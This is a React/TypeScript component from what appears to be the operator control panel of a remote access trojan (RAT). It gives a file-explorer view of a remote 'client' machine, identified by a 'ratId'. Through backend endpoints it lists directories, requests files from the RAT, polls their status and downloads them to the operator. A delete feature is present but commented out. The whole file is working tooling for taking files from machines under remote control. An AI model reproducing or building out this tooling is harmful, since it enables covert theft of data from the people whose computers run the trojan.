"use client"

import { useState, useEffect } from "react"
import { HardDrive, FolderOpen, File, ArrowLeft, Download } from "lucide-react"
import type { Client } from "@/types/client"
import { AnimatedModal } from "@/components/ui/modal"
import { Input } from "@/components/ui/input"
import { Button } from "@/components/ui/button"
import axios from "axios"
import { toast } from "sonner"
import { FileNodeData, FileTreeItem } from "@/types/dirtree"
import { formatFileSize, formatDate } from "@/utils/format"

interface FileExplorerModalProps {
  isOpen: boolean
  onClose: () => void
  client: Client
}


const API_BASE_URL = "/api"

const FileExplorerModal = ({ isOpen, onClose, client }: FileExplorerModalProps) => {
  const [currentPath, setCurrentPath] = useState("/")
  const [pathString, setPathString] = useState(currentPath)
  const [selectedFile, setSelectedFile] = useState<FileTreeItem | null>(null)
  const [isLoading, setIsLoading] = useState(false)
  const [files, setFiles] = useState<FileTreeItem[]>([])
  const [downloadingFile, setDownloadingFile] = useState<string | null>(null)

  useEffect(() => {
    if (isOpen) {
      loadFilesForPath(currentPath)
    }
  }, [isOpen])

  const loadFilesForPath = async (path: string) => {
    setIsLoading(true)
    setSelectedFile(null)
  
    try {
      const response = await axios.post(`${API_BASE_URL}/ListDirTree`, {
        ratId: client.id,
        Path: path,
        depth: 0
      })
  
      const fileData: FileNodeData[] = response.data || []
      console.log("File data: ", fileData)
      // Transform API response to our FileItem format
      const transformedFiles: FileTreeItem[] = fileData.map((item) => {
        if (item.filetype === "directory") {
          return {
            name: item.name,
            type: "directory",
            size: null,
            modified: null,
          }
        } else if (item.filetype === "file" && "File" in item.node) {
          return {
            name: item.name,
            type: "file",
            size: formatFileSize(item.node.File.size),
            modified: formatDate(item.node.File.modified),
          }
        }
        return null
      }).filter((item): item is FileTreeItem => item !== null)
  
      console.log("Files: ", transformedFiles)
      setFiles(transformedFiles)
      setCurrentPath(path)
      setPathString(path)
    } catch (error) {
      console.error("Error loading files:", error)
      toast.error("Failed to load files. The client might be offline.")
      setFiles([])
    } finally {
      setIsLoading(false)
    }
  }

  const navigateTo = (path: string) => {
    loadFilesForPath(path)
  }

  const navigateUp = () => {
    const pathParts = currentPath.split("/")
    pathParts.pop()
    const parentPath = pathParts.join("/") || "/"
    navigateTo(parentPath)
  }

  const handleFileClick = (file: FileTreeItem) => {
    if (file.type === "directory") {
      navigateTo(`${currentPath}/${file.name}`.replace(/\/\//g, '/'))
    } else {
      setSelectedFile(file)
    }
  }

  const downloadFile = async (file: FileTreeItem) => {
    try {
      setDownloadingFile(file.name)
      const filePath = `${currentPath}/${file.name}`.replace(/\/\//g, '/')
      
      // First request the file from the RAT
      const requestResponse = await axios.post(`${API_BASE_URL}/RequestFile`, {
        ratId: client.id,
        filePath: filePath
      })
      
      const downloadId = requestResponse.data.Success?.DownloadId
      
      if (!downloadId) {
        toast.error("Failed to initiate file download")
        return
      }
      
      // Poll for download status
      let isComplete = false
      let attempts = 0
      const maxAttempts = 30
      
      while (!isComplete && attempts < maxAttempts) {
        attempts++
        
        // Check file download status
        const statusResponse = await axios.get(`${API_BASE_URL}/GetFileDownloadStatus`, {
          data: {
            ratId: client.id,
            downloadId: downloadId
          }
        })
        
        const status = statusResponse.data.Success?.Status
        
        if (status === "InProgress") {
          isComplete = true
          
          // Download the file
          const downloadUrl = `${API_BASE_URL}/DownloadFile/${client.id}/${downloadId}`
          
          // Create a link and trigger download
          const link = document.createElement("a")
          link.href = downloadUrl
          link.setAttribute("download", file.name)
          document.body.appendChild(link)
          link.click()
          document.body.removeChild(link)
          
          toast.success(`Downloading File ${file.name}`)
          break
        } else if (status === "Failed") {
          toast.error(`Failed to download ${file.name}`)
          break
        }
        
        // Wait before next check
        await new Promise(r => setTimeout(r, 1000))
      }
      
      if (!isComplete) {
        toast.error("Download timed out. Please try again.")
      }
    } catch (error) {
      console.error("Error downloading file:", error)
      toast.error(`Failed to download ${file.name}`)
    } finally {
      setDownloadingFile(null)
    }
  }

  return (
    <AnimatedModal
      isOpen={isOpen}
      onClose={onClose}
      title={`File Explorer - ${client.name}`}
      icon={<HardDrive className="h-5 w-5 text-primary" />}
      initialWidth={900}
      initialHeight={600}
      minWidth={600}
      minHeight={400}
    >
      <div className="flex flex-col h-full space-y-4">
        <div className="flex items-center gap-2">
          <Button
            onClick={navigateUp}
            disabled={currentPath === "/" || isLoading}
            className="bg-muted text-muted-foreground p-2 rounded hover:bg-muted/80 disabled:opacity-50 disabled:cursor-not-allowed"
          >
            <ArrowLeft className="h-4 w-4" />
          </Button>

          <Input
            className="flex-1 glass-input rounded px-3 py-2 overflow-x-auto whitespace-nowrap"
            value={pathString}
            onChange={(e) => setPathString(e.target.value)}
            onKeyDown={(e) => {
              if (e.key === "Enter") {
                navigateTo(e.currentTarget.value.trim())
              }
            }}
            disabled={isLoading}
          />
        </div>

        <div className="grid grid-cols-1 md:grid-cols-4 gap-4 flex-grow">
          <div className="md:col-span-3 glass-card rounded overflow-hidden h-full">
            {isLoading ? (
              <div className="flex justify-center items-center h-full">
                <div className="animate-spin rounded-full h-8 w-8 border-t-2 border-b-2 border-primary"></div>
              </div>
            ) : (
              <div className="h-full overflow-auto">
                <table className="w-full text-sm">
                  <thead className="bg-muted sticky top-0 z-10">
                    <tr>
                      <th className="text-left p-3">Name</th>
                      <th className="text-left p-3">Size</th>
                      <th className="text-left p-3">Modified</th>
                    </tr>
                  </thead>
                  <tbody>
                    {files.map((file, index) => (
                      <tr
                        key={index}
                        className={`border-t border-border hover:bg-muted/50 cursor-pointer ${selectedFile?.name === file.name ? "bg-muted/50" : ""}`}
                        onClick={() => handleFileClick(file)}
                      >
                        <td className="p-3 flex items-center gap-2">
                          {file.type === "directory" ? (
                            <FolderOpen className="h-4 w-4 text-primary" />
                          ) : (
                            <File className="h-4 w-4 text-muted-foreground" />
                          )}
                          {file.name}
                        </td>
                        <td className="p-3">{file.size || "--"}</td>
                        <td className="p-3">{file.modified || "--"}</td>
                      </tr>
                    ))}
                    {files.length === 0 && (
                      <tr>
                        <td colSpan={3} className="p-3 text-center text-muted-foreground">
                          No files found in this directory
                        </td>
                      </tr>
                    )}
                  </tbody>
                </table>
              </div>
            )}
          </div>

          <div className="glass-card rounded p-4 h-full overflow-auto">
            <h3 className="font-medium mb-3">File Details</h3>
            {selectedFile ? (
              <div className="space-y-3">
                <div>
                  <div className="text-muted-foreground text-xs">Name</div>
                  <div>{selectedFile.name}</div>
                </div>
                <div>
                  <div className="text-muted-foreground text-xs">Type</div>
                  <div className="capitalize">{selectedFile.type}</div>
                </div>
                {selectedFile.size && (
                  <div>
                    <div className="text-muted-foreground text-xs">Size</div>
                    <div>{selectedFile.size}</div>
                  </div>
                )}
                {selectedFile.modified && (
                  <div>
                    <div className="text-muted-foreground text-xs">Modified</div>
                    <div>{selectedFile.modified}</div>
                  </div>
                )}
                <div>
                  <div className="text-muted-foreground text-xs">Path</div>
                  <div className="break-all text-xs">
                    {currentPath}/{selectedFile.name}
                  </div>
                </div>

                <div className="pt-2 flex flex-col gap-2">
                  {selectedFile.type === "file" && (
                    <Button 
                      onClick={() => downloadFile(selectedFile)}
                      disabled={downloadingFile === selectedFile.name}
                      className="bg-primary text-primary-foreground px-3 py-2 rounded flex items-center gap-2 hover:bg-primary/90 transition-colors text-sm"
                    >
                      {downloadingFile === selectedFile.name ? (
                        <>
                          <div className="animate-spin h-4 w-4 border-2 border-primary-foreground border-t-transparent rounded-full"></div>
                          <span>Downloading...</span>
                        </>
                      ) : (
                        <>
                          <Download className="h-4 w-4" />
                          <span>Download</span>
                        </>
                      )}
                    </Button>
                  )}
                  {/* NOTE: Delete functionality commented out for safety - uncomment if needed */}
                  {/* <Button className="bg-destructive text-destructive-foreground px-3 py-2 rounded flex items-center gap-2 hover:bg-destructive/90 transition-colors text-sm">
                    <Trash className="h-4 w-4" />
                    <span>Delete</span>
                  </Button> */}
                </div>
              </div>
            ) : (
              <div className="text-muted-foreground text-sm">Select a file or folder to view details</div>
            )}
          </div>
        </div>
      </div>
    </AnimatedModal>
  )
}

export default FileExplorerModal